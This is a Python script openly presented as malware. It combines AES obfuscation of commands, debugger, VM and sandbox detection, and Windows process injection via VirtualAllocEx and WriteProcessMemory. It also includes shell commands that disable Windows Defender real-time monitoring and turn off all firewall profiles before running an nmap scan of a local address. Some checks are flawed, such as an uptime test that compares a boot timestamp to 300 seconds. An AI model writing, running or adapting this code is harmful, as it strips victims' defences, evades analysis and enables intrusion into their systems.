import os
import sys
import time
import base64
import subprocess
import psutil
import platform
import ctypes
from Crypto.Cipher import AES

# ---- Obfuscation: AES Encryption for Payloads ---- #
KEY = b"thisisakey123456"  # 16-byte AES key

def encrypt_payload(payload):
    cipher = AES.new(KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(payload.encode())
    return base64.b64encode(cipher.nonce + ciphertext).decode()

def decrypt_payload(encoded_payload):
    raw_data = base64.b64decode(encoded_payload)
    nonce = raw_data[:16]
    ciphertext = raw_data[16:]
    cipher = AES.new(KEY, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt(ciphertext).decode()

# ---- Anti-Analysis: VM, Debugger, and Sandbox Detection ---- #
def is_debugger_present():
    return sys.gettrace() is not None

def detect_vm():
    vm_signatures = ["VBox", "VMware", "QEMU", "VirtualBox"]
    process_list = os.popen("tasklist").read()
    for signature in vm_signatures:
        if signature in process_list:
            return True
    return False

def check_sandbox():
    if psutil.boot_time() < 300:  # Less than 5 min uptime
        return True
    if psutil.cpu_percent(interval=1) < 10:  # Low CPU usage
        return True
    return False

def security_checks():
    if is_debugger_present():
        print("Debugger detected! Exiting...")
        sys.exit()
    if detect_vm():
        print("VM detected! Exiting...")
        sys.exit()
    if check_sandbox():
        print("Sandbox detected! Exiting...")
        sys.exit()

# ---- Process Injection (Windows Only) ---- #
def inject_into_process(pid, shellcode):
    if platform.system() != "Windows":
        return False
    PROCESS_ALL_ACCESS = 0x1F0FFF
    kernel32 = ctypes.windll.kernel32
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        return False
    allocated_memory = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), 0x3000, 0x40)
    kernel32.WriteProcessMemory(h_process, allocated_memory, shellcode, len(shellcode), 0)
    return True

# ---- Security Evasion ---- #
def disable_windows_defender():
    if platform.system() == "Windows":
        os.system("powershell Set-MpPreference -DisableRealtimeMonitoring $true")

def disable_firewall():
    os.system("netsh advfirewall set allprofiles state off")

# ---- Malware Behavior ---- #
def execute_malicious_code():
    security_checks()  # Run security checks before execution
    disable_windows_defender()
    disable_firewall()
    
    command = "nmap -sV 192.168.1.1"
    encoded_command = encrypt_payload(command)
    decrypted_command = decrypt_payload(encoded_command)
    os.system(decrypted_command)

if __name__ == "__main__":
    execute_malicious_code()
